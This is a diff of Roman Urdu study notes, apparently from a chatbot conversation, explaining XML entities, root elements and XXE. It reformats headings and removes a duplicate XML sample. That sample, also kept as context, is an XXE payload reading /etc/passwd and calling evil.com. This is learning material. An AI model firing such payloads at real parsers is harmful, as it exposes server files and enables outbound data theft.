@@ -15,13 +15,13 @@ Answer: 👉 **XML parsers ki default settings unsafe hoti hain** — Matlab by 
 
 ---
 
-Question: Ab mujy normal entity bhi btao kya hoti hai or external bhi or internal bhi sub ki command ka structure dekhao
+### Question: Ab mujy normal entity bhi btao kya hoti hai or external bhi or internal bhi sub ki command ka structure dekhao
 
 Burp callaboraotor ka use kr ky hum ny kidhar request mari kya hamary server ny request ki ya website ny or jis pr ki kya woh bhi dosra server tha ya phir dosri website 
 
 ---
 
-Answer ## 🔹 Entities in XML
+### Answer 🔹 Entities in XML
 
 XML **Entities** basically ek short-cut / placeholder hote hain jo parser expand karke asli value bana deta hai.
 
@@ -121,9 +121,9 @@ Tum restaurant main order dete ho:
 
 ---
 
-Matlab jo tum ny external entity ki example di iss main yeh hua ky website ky server sy passwd wala data nikla or jo mane url diya ius pr woh chala gya automatically ya phir request ki connection bnany ki or isky baad kya hua
+## Question Matlab jo tum ny external entity ki example di iss main yeh hua ky website ky server sy passwd wala data nikla or jo mane url diya ius pr woh chala gya automatically ya phir request ki connection bnany ki or isky baad kya hua
 
-## 🔹 Jab tumne External Entity dala:
+## Answer 🔹 Jab tumne External Entity dala:
 
 ```xml
 <!DOCTYPE note [
@@ -181,20 +181,7 @@ Matlab jo tum ny external entity ki example di iss main yeh hua ky website ky se
 
 ---
 
-Ab dekho yeh xml hai
-
-<!DOCTYPE note [
-  <!ENTITY file SYSTEM "file:///etc/passwd">
-  <!ENTITY url SYSTEM "http://evil.com/malicious">
-]>
-<note>
-  <to>&file;</to>
-  <from>&url;</from>
-</note>
-
----
-
-Ab dekho yeh xml hai
+## Question Ab dekho yeh xml hai
 
 <!DOCTYPE note [
   <!ENTITY file SYSTEM "file:///etc/passwd">
@@ -207,7 +194,7 @@ Ab dekho yeh xml hai
 
 Iss main sirf jis line main Entity likha hai wohi entity hai. Or agar aisa hai too baki lines ko Kya Kehty hain
 
-Answer: ## XML Breakdown
+## Answer: XML Breakdown
 
 ```xml
 <!DOCTYPE note [
@@ -285,13 +272,13 @@ Har XML document ka ek hi root element hota hai. Yahaan `note` hai.
 
 ---
 
-Question: Acha ab too aik or baat samny agyi chatgpt ka + point ky xml main sirf  aik hi root element use hoo skta hai xml main phir chahe structure kitna bhi bara kiun na hoo ab tum mujy woh sub elements btao jo root elements hain 
+## Question: Acha ab too aik or baat samny agyi chatgpt ka + point ky xml main sirf  aik hi root element use hoo skta hai xml main phir chahe structure kitna bhi bara kiun na hoo ab tum mujy woh sub elements btao jo root elements hain 
 
 <to> or <from> kya yeh tags lagana zaroori thy ya phir iski jagah random name bhi rakh skty thy or tags lagana bht zyada zaroori hai 
 
 ---
 
-Answer: ## 🔹 1. Root Element Rule
+## Answer: 🔹 1. Root Element Rule
 
 XML ka **golden rule** hai:
 👉 **Sirf ek hi root element hota hai**.
@@ -364,5 +351,3 @@ Yeh valid hai technically agar tum sirf text rakhna chaho, lekin structured data
 * **Tags lagana bohot zaroori hai**, warna XML structured data ka faida hi khatam ho jata.
 
 ---
-
-Bhai, chaho to main tumhe ek **mini XML ka real-world example** bana kar dikhaun (jaise ek invoice ya student record), jisme root aur child elements clearly nazar aayen?
